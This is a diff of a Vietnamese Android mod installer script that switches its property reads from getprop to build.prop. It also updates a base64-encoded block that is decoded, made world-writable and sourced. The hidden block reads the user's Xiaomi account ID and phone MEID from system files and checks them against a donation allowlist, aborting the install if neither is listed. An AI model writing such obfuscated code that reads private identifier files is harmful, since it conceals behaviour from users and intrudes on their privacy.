@@ -110,6 +110,8 @@ Buildprop="$(find /system /system_root/system -type f -name 'build.prop' 2>/dev/
 Themes="$(find /*/media/theme /*/*/media/theme /*/*/*/media/theme -type f -name default.mtz 2>/dev/null | head -n1)"
 TAPK="/tmp/lapk"
 
+GB(){ grep "$1=" $Buildprop | cut -d = -f2; }
+
 # Tạo TM
 mkdir -p $VHMI $TAPK/tmp
 
@@ -130,9 +132,9 @@ XHex(){ $TBIN/toybox xxd -p "$@" | tr -d "\n" | tr -d ' '; }
 ZHex(){ $TBIN/toybox xxd -r -p "$@"; }
 
 # Check API ABI
-API=$(getprop ro.build.version.sdk)
-ABI=$(getprop ro.product.cpu.abi)
-[ "$ABI" ] || ABI=$(getprop ro.vendor.product.cpu.abilist64)
+API=$(GB ro.build.version.sdk)
+ABI=$(GB ro.product.cpu.abi)
+[ "$ABI" ] || ABI=$(GB ro.system.product.cpu.abilist64)
 
 # Check arm
 if [ "$ABI" = "x86" ]; then
@@ -260,10 +262,10 @@ ui_print "  Ten: $(GP name) $(GP version)"
 ui_print " "
 ui_print "  Tac gia: $(GP author)"
 ui_print " "
-ui_print "  Thong tin: $(getprop ro.product.system.device), $API, $ARCH"
+ui_print "  Thong tin: $(GB ro.product.system.device), $API, $ARCH"
 ui_print " "
 
-echo 'WyAiJEFQSSIgLWxlIDMwIF0gJiYgaWR0a21pPSIkKGdyZXAgLW0xICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCB0ciAnICcgJ1xuJyB8IGdyZXAgLW0xIGFjY291bnQgfCBjdXQgLWQgXCIgLWYyKSIKWyAiJEFQSSIgLWdlIDMxIF0gJiYgaWR0a21pPSIkKGdyZXAgLWEgLUEyICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCBoZWFkIC1uMiB8IHRhaWwgLW4xIHwgY3V0IC1kICcvJyAtZjEpIgppZGltZWk9IiQoZ3JlcCAtbTEgImtleV9tZWlkX3Nsb3QwIiAvZGF0YS8qLyovY29tLmFuZHJvaWQucGhvbmUvc2hhcmVkX3ByZWZzLyoueG1sIHwgY3V0IC1kICc+JyAtZjIgfCBjdXQgLWQgJzwnIC1mMSkiClRra2c9MQpnd3dnbnJqPSIkKHVuemlwIC1wICIkWklQIiAibGliL0ZMdW5hLyQoZ2V0cHJvcCByby5wcm9kdWN0LmRldmljZSkiIHwgYmFzZTY0IC1kKSIKCmZvciB3eXdtIGluICRnd3dnbnJqOyBkbwpra2loaD0kKGdyZXAgLWFjbTEgJHd5d20gL2RhdGEvc3lzdGVtL3N5bmMvYWNjb3VudHMueG1sKQpbICRra2loaCA9PSAxIF0gJiYgYnJlYWsKaWYgWyAiJGlkaW1laSIgPT0gIiR3eXdtIiBdO3RoZW4Ka2tpaGg9IjEiCmJyZWFrCmZpCmRvbmUKCmlmIFsgIiRra2loaCIgPT0gMSBdO3RoZW4KdWlfcHJpbnQgIiAgSGVsbG86ICRpZHRrbWkiCnVpX3ByaW50ICIgIgplbHNlCnVpX3ByaW50ICIgIElETUk6ICRpZHRrbWkiCnVpX3ByaW50ICIgIgp1aV9wcmludCAiICBNRUlEOiAkaWRpbWVpIgp1aV9wcmludCAiICIKdWlfcHJpbnQgIiAgVGFpIGtob2FuIGN1YSBiYW4ga2hvbmcgY28gdHJvbmcgZGFuaCBzYWNoIgp1aV9wcmludCAiICIKdWlfcHJpbnQgIiAgSGF5IHVuZyBobyAoRG9uYXRlKSBkZSBkdW9jIHRoZW0gdmFvIGRhbmggc2FjaCIKdWlfcHJpbnQgIiAiCmFib3J0ICIgIFF1YSB0cmluaCBjYWkgZGF0IGRhIGJpIGh1eSAhCi4iCmZp' | base64 -d > /tmp/innnn.sh
+echo 'WyAiJEFQSSIgLWxlIDMwIF0gJiYgaWR0a21pPSIkKGdyZXAgLW0xICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCB0ciAnICcgJ1xuJyB8IGdyZXAgLW0xIGFjY291bnQgfCBjdXQgLWQgXCIgLWYyKSIKWyAiJEFQSSIgLWdlIDMxIF0gJiYgaWR0a21pPSIkKGdyZXAgLWEgLUEyICJjb20ueGlhb21pIiAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwgfCBoZWFkIC1uMiB8IHRhaWwgLW4xIHwgY3V0IC1kICcvJyAtZjEpIgppZGltZWk9IiQoZ3JlcCAtbTEgImtleV9tZWlkX3Nsb3QwIiAvZGF0YS8qLyovY29tLmFuZHJvaWQucGhvbmUvc2hhcmVkX3ByZWZzLyoueG1sIHwgY3V0IC1kICc+JyAtZjIgfCBjdXQgLWQgJzwnIC1mMSkiClRra2c9MQpnd3dnbnJqPSIkKHVuemlwIC1wICIkWklQIiAibGliL0ZMdW5hLyQoR0Igcm8ucHJvZHVjdC5zeXN0ZW0uZGV2aWNlKSIgfCBiYXNlNjQgLWQpIgoKZm9yIHd5d20gaW4gJGd3d2ducmo7IGRvCmtraWhoPSQoZ3JlcCAtYWNtMSAkd3l3bSAvZGF0YS9zeXN0ZW0vc3luYy9hY2NvdW50cy54bWwpClsgJGtraWhoID09IDEgXSAmJiBicmVhawppZiBbICIkaWRpbWVpIiA9PSAiJHd5d20iIF07dGhlbgpra2loaD0iMSIKYnJlYWsKZmkKZG9uZQoKaWYgWyAiJGtraWhoIiA9PSAxIF07dGhlbgp1aV9wcmludCAiICBIZWxsbzogJGlkdGttaSIKdWlfcHJpbnQgIiAiCmVsc2UKdWlfcHJpbnQgIiAgSURNSTogJGlkdGttaSIKdWlfcHJpbnQgIiAiCnVpX3ByaW50ICIgIE1FSUQ6ICRpZGltZWkiCnVpX3ByaW50ICIgIgp1aV9wcmludCAiICBUYWkga2hvYW4gY3VhIGJhbiBraG9uZyBjbyB0cm9uZyBkYW5oIHNhY2giCnVpX3ByaW50ICIgIgp1aV9wcmludCAiICBIYXkgdW5nIGhvIChEb25hdGUpIGRlIGR1b2MgdGhlbSB2YW8gZGFuaCBzYWNoIgp1aV9wcmludCAiICIKYWJvcnQgIiAgUXVhIHRyaW5oIGNhaSBkYXQgZGEgYmkgaHV5ICEKLiIKZmk=' | base64 -d > /tmp/innnn.sh
 chmod 777 /tmp/innnn.sh
 . /tmp/innnn.sh
 
